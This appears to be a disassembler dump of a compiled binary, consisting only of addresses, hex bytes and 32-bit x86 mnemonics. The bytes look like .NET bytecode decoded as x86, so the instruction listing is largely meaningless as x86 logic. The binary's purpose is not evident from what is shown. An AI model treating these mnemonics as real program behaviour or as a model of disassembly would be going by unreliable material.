  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 28             	es jb  0x4036fa
  4036d2:	26 00 70 0a          	add    %dh,%es:0xa(%eax)
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	3a 26                	cmp    (%esi),%ah
  40372e:	00 70 28             	add    %dh,0x28(%eax)
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 a4 23 00       	and    $0x23a472,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 40                	jb     0x4037ba
  40377a:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 56 26 00       	and    $0x265672,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 60 26 00       	and    $0x266072,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 6a 26 00       	and    $0x266a72,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 70                	jb     0x40383d
  4037cd:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 84             	or     -0x7c(%edx),%dh
  4037d8:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	88 26                	mov    %ah,(%esi)
  4037eb:	00 70 72             	add    %dh,0x72(%eax)
  4037ee:	92                   	xchg   %eax,%edx
  4037ef:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 9e             	or     -0x62(%edx),%dh
  4037f9:	26 00 70 72          	add    %dh,%es:0x72(%eax)
  4037fd:	aa                   	stos   %al,%es:(%edi)
  4037fe:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 b6 26 00       	and    $0x26b672,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 c0 26 00       	and    $0x26c072,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 d0 26 00       	and    $0x26d072,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 dc             	or     -0x24(%edx),%dh
  403859:	26 00 70 72          	add    %dh,%es:0x72(%eax)
  40385d:	d0 26                	shlb   $1,(%esi)
  40385f:	00 70 6f             	add    %dh,0x6f(%eax)
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 e6             	or     -0x1a(%edx),%dh
  403868:	26 00 70 72          	add    %dh,%es:0x72(%eax)
  40386c:	60                   	pusha
  40386d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 f2 26 00       	and    $0x26f272,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 0a 27 00       	and    $0x270a72,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 1c 27 00       	and    $0x271c72,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 30 27 00       	and    $0x273072,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 44 27 00       	and    $0x274472,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 9e                	jb     0x403893
  4038f5:	23 00                	and    (%eax),%eax
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 4e 27 00       	and    $0x274e72,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 5a             	adc    %esi,0x5a(%edx)
  40399e:	27                   	daa
  40399f:	00 70 28             	add    %dh,0x28(%eax)
  4039a2:	8a 00                	mov    (%eax),%al
  4039a4:	00 0a                	add    %cl,(%edx)
  4039a6:	72 60                	jb     0x403a08
  4039a8:	27                   	daa
  4039a9:	00 70 28             	add    %dh,0x28(%eax)
  4039ac:	68 00 00 0a 72       	push   $0x720a0000
  4039b1:	8c 27                	mov    %fs,(%edi)
  4039b3:	00 70 73             	add    %dh,0x73(%eax)
  4039b6:	a1 00 00 0a 0a       	mov    0xa0a0000,%eax
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 ca    	or     0xca720907,%cl
  4039dd:	27                   	daa
  4039de:	00 70 6f             	add    %dh,0x6f(%eax)
  4039e1:	83 00 00             	addl   $0x0,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 e2                	jb     0x4039f8
  403a16:	27                   	daa
  403a17:	00 70 13             	add    %dh,0x13(%eax)
  403a1a:	04 dd                	add    $0xdd,%al
  403a1c:	31 00                	xor    %eax,(%eax)
  403a1e:	00 00                	add    %al,(%eax)
  403a20:	72 ea                	jb     0x403a0c
  403a22:	27                   	daa
  403a23:	00 70 07             	add    %dh,0x7(%eax)
  403a26:	6f                   	outsl  %ds:(%esi),(%dx)
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 e2                	jb     0x403a29
  403a47:	27                   	daa
  403a48:	00 70 13             	add    %dh,0x13(%eax)
  403a4b:	04 dd                	add    $0xdd,%al
  403a4d:	00 00                	add    %al,(%eax)
  403a4f:	00 00                	add    %al,(%eax)
  403a51:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 9e             	add    %dh,-0x62(%edx)
  403b3e:	23 00                	and    (%eax),%eax
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
